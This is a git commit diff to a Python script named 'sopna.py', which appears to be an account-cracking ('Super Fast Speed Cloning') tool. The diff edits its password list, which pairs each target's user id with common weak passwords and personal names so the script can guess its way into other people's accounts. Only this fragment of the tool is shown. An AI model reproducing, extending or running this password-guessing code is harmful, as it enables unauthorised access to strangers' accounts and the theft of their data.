a2607163e9f4d31f87d1d1453d11fae545bed497
bipul159 <115370450+bipul159@users.noreply.github.com>
2023-09-23 10:05:12 +0600

    Add files via upload

--- sopna.py
+++ sopna.py
@@ -202,7 +202,7 @@ def xxr():
         jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
         jalan('\033[1;97m====================================================')
         
-            pwx = [uid,'freefire@123','freefire@321','free fire','free fire123','free fire@123','free fire321',' free fire@321','free fire123','i love you','jannat','tamanna','sadiya','shopna','nusrat']
+            pwx = [uid,'freefire@321','free fire','freefire123','i love you','jannat','tamanna','sadiya','shopna','nusrat']
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
